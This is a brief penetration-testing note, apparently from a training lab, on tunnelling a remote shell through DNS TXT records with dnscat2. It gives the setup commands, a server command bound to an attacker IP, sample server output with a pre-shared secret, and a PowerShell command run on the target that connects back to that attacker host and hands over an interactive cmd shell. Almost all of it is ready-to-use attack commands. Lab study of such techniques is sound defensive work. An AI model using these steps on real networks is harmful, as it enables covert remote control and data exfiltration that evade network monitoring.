Sends data inside the TXT record within the DNS protocol.

Setup:

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
sudo gem install bundler
sudo bundle install

git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Attacking device:

```bash
sudo ruby dnscat2.rb --dns host=<your_ip>,port=53,domain=<domain> --no-cache
```

Example: 

```bash
sudo ruby dnscat2.rb --dns host=10.10.15.35,port=53,domain=inlanefreight.local --no-cache

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.15.35:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=b09d8b08b6c9afbffab2c352046bf371 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=b09d8b08b6c9afbffab2c352046bf371

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2> New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

```

Grab the secret key. In this case: b09d8b08b6c9afbffab2c352046bf371

Target:

```bash
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.15.35 -Domain inlanefreight.local -PreSharedSecret b09d8b08b6c9afbffab2c352046bf371 -Exec cmd
```

Back on the attacking device:

```bash
dnscat2> window -i 1
```

Now have fully interactive shell (slow)

